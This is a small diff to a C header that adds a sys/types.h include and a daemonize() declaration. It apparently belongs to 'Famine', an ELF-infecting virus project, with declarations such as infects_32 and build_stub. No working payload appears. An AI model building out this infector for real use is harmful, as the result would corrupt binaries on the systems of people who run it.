@@ -17,6 +17,7 @@
 # include <sys/syscall.h>
 # include <sys/mman.h>
 # include <sys/stat.h>
+# include <sys/types.h>
 # include <elf.h>
 # include <stdbool.h>
 # include <dirent.h>
@@ -71,4 +72,6 @@ int     infects_32(t_binary *binary, char *full_path);
 bool    build_stub(t_famine *p, const unsigned char *stub, size_t stub_len);
 int     file_handler(char *path);
 char    *build_path(char *path, char *filename);
+
+void    daemonize(void);
 #endif
